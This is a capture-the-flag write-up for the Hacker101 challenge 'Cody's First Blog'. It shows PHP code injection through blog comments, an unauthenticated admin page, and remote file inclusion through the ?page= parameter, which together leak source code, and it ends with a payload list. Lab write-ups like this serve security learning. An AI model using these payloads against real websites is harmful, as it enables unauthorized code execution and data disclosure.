# 📝 Cody's First Blog

> **Platform:** Hacker101 CTF &nbsp;|&nbsp; **Difficulty:** `Moderate` &nbsp;|&nbsp; **Flags:** `3/3` ✅

---

## ⛓️ Attack Chain

```
PHP Code Injection via comments  →  Admin bypass  →  Remote File Inclusion  →  Source code leak  →  Flags
```

---

## 🔍 Application Overview

A simple PHP blog where visitors can submit comments for admin approval. The first post hints everything:

> *"PHP doesn't need a template language because it is a template language. This server can't talk to the outside world and nobody but me can upload files, so there's no risk in just using include()."*

The `?page=` parameter is passed directly into PHP's `include()` function. Combined with `allow_url_include = On`, this opens the door to Remote File Inclusion (RFI).

---

## 🚩 Flag 0 — PHP Code Injection via Comments

The comment box accepts and stores raw PHP. Once approved by admin, the code executes when the page loads.

Submit this as a comment:
```php
<?php echo "test"; ?>
```

The flag appears immediately after the comment is approved.

---

## 🚩 Flag 1 — Admin Panel Bypass

The page source contains a commented-out link to the admin panel:

```html
<!-- <a href="?page=admin.auth.inc">Admin</a> -->
```

Navigate directly to it:
```
/?page=admin.auth.inc
```

Admin panel loads with no authentication required. Use it to approve pending comments.

---

## 🚩 Flag 2 — Remote File Inclusion + Source Code Leak

**Step 1 — Submit a malicious comment:**
```php
<?php readfile("index.php"); ?>
```

**Step 2 — Approve it** from the admin panel at `?page=admin.auth.inc`

**Step 3 — Trigger Remote File Inclusion:**
```
/?page=http://localhost/index
```

The server fetches its own homepage via HTTP. Because `allow_url_include = On`, PHP executes any `<?php ?>` tags it finds — including your approved comment.

**Step 4 — View page source (`Ctrl+U`)**

`readfile("index.php")` dumps the raw source code of `index.php`. The flag is hidden inside it.

> ⚠️ **Why `http://localhost/index` and not a direct path?**  
> A direct path like `?page=index` would just read the file as text — PHP wouldn't execute the comments inside it. Fetching via HTTP forces PHP to process the page again, which triggers execution of your injected code.

---

## 🧠 Why It Works

| Vulnerability | Root Cause |
|---|---|
| PHP Code Injection | Comment box stores and executes raw PHP with no sanitization |
| Admin Bypass | Admin page URL exposed in HTML source, no authentication enforced |
| Remote File Inclusion | `include()` accepts URLs with `allow_url_include = On` |

---

## 📋 Payloads

```php
-- Flag 0: PHP injection via comment
<?php echo "test"; ?>

-- Flag 1: Admin panel bypass
/?page=admin.auth.inc

-- Flag 2: RFI + source code dump
Comment: <?php readfile("index.php"); ?>
Trigger: /?page=http://localhost/index
```
